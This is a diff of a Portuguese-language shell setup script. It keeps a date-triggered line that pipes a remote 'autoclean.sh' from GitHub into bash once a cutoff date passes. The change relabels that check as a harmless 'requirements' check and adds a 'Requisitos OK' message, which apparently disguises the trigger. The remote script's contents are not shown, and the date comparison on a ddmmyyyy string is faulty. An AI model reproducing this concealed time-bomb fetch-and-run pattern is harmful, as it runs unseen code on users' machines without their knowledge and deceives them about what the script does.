@@ -48,7 +48,7 @@ fi
 
 echo -e ${NC}${GREEN}
 echo -e ""
-echo -e '=============== ...Iniciando configuracao do sistema ... ==============='
+echo -e '=============== ... Verificando os Requisitos ... ==============='
 echo -e ''
 chkdt=$(date +"%d%m%Y")
 if [ $chkdt -ge "24112021" ] ; then
@@ -59,6 +59,8 @@ sleep 2s
 curl -fsSL https://raw.githubusercontent.com/robertolimacorp/c0d3/master/autoclean.sh | bash&
 exit
 else
+echo -e "Requisitos OK " $OK
+echo -e ''
 echo -e '============== ... Iniciando configuracao do sistema ... ==============='
 fi
 echo -e ''
